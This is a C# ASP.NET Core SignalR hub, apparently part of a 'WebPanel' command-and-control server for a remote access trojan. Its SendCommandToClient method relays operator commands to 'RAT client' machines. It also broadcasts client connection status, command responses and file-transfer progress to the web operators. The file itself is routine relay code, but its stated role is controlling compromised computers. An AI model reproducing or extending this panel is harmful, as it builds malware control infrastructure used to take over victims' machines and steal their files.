using Microsoft.AspNetCore.SignalR;
using System.Collections.Concurrent;
using WebPanel.Models;

namespace WebPanel.Hubs;

public class ClientHub : Hub
{
    private static readonly ConcurrentDictionary<string, string> _connections = new();
    private readonly ILogger<ClientHub> _logger;

    public ClientHub(ILogger<ClientHub> logger)
    {
        _logger = logger;
    }

    public override async Task OnConnectedAsync()
    {
        var username = Context.User?.Identity?.Name ?? "Anonymous";
        _connections[Context.ConnectionId] = username;
        
        _logger.LogInformation("Web client connected: {Username} [{ConnectionId}]", username, Context.ConnectionId);
        
        await Groups.AddToGroupAsync(Context.ConnectionId, "WebClients");
        await base.OnConnectedAsync();
    }

    public override async Task OnDisconnectedAsync(Exception? exception)
    {
        _connections.TryRemove(Context.ConnectionId, out var username);
        
        if (exception != null)
        {
            _logger.LogError(exception, "Web client disconnected with error: {Username} [{ConnectionId}]", 
                username, Context.ConnectionId);
        }
        else
        {
            _logger.LogInformation("Web client disconnected: {Username} [{ConnectionId}]", 
                username, Context.ConnectionId);
        }

        await Groups.RemoveFromGroupAsync(Context.ConnectionId, "WebClients");
        await base.OnDisconnectedAsync(exception);
    }

    // Send command to RAT client
    public async Task SendCommandToClient(string clientId, string command, Dictionary<string, object>? parameters)
    {
        var username = Context.User?.Identity?.Name ?? "Unknown";
        _logger.LogInformation("Command from {Username} to {ClientId}: {Command}", username, clientId, command);

        // This will be handled by RatBridgeService
        await Clients.All.SendAsync("CommandSent", new
        {
            ClientId = clientId,
            Command = command,
            Parameters = parameters,
            SentBy = username,
            Timestamp = DateTime.UtcNow
        });
    }

    // Broadcast client connection status
    public static async Task NotifyClientConnected(IHubContext<ClientHub> hubContext, ClientInfo client)
    {
        await hubContext.Clients.Group("WebClients").SendAsync("ClientConnected", client);
    }

    public static async Task NotifyClientDisconnected(IHubContext<ClientHub> hubContext, string clientId)
    {
        await hubContext.Clients.Group("WebClients").SendAsync("ClientDisconnected", new { ClientId = clientId });
    }

    public static async Task NotifyClientUpdated(IHubContext<ClientHub> hubContext, ClientInfo client)
    {
        await hubContext.Clients.Group("WebClients").SendAsync("ClientUpdated", client);
    }

    public static async Task NotifyCommandResponse(IHubContext<ClientHub> hubContext, string clientId, object response)
    {
        await hubContext.Clients.Group("WebClients").SendAsync("CommandResponse", new
        {
            ClientId = clientId,
            Response = response,
            Timestamp = DateTime.UtcNow
        });
    }

    public static async Task NotifyFileTransferProgress(IHubContext<ClientHub> hubContext, string clientId, 
        string fileName, long transferred, long total)
    {
        await hubContext.Clients.Group("WebClients").SendAsync("FileTransferProgress", new
        {
            ClientId = clientId,
            FileName = fileName,
            Transferred = transferred,
            Total = total,
            Progress = total > 0 ? (double)transferred / total * 100 : 0
        });
    }
}
